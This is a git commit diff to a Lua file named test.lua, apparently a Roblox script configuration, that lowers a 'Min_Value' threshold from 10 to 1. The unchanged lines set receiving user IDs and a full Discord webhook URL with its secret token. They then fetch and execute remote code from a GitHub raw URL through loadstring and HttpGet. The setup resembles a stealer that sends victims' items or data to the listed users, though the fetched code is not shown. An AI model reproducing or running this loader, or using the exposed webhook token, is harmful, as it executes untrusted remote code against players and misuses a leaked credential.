588c0322d870fea1ac31e4f1727810fde52089d0
Saanti56 <152914951+Saanti56@users.noreply.github.com>
2026-05-16 18:14:43 -0300

    Change Min_Value from 10 to 1

--- test.lua
+++ test.lua
@@ -1,7 +1,7 @@
 _G["Script-SM_Config"] = {
     ["users"] = {"F1212049"},
     ["user_webhook"] = "https://discord.com/api/webhooks/1505310290731073696/hl01nGjJzW2FB4hYlUFolMoCoHhr1aAuIPX9IDyffrahVJNJI6XiQD1tw54Xc9w1_faO",
-    ["Min_Value"] = 10,
+    ["Min_Value"] = 1,
     ["Min_Ping"] = 125
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/script-9209/Test/refs/heads/main/biscuit"))()
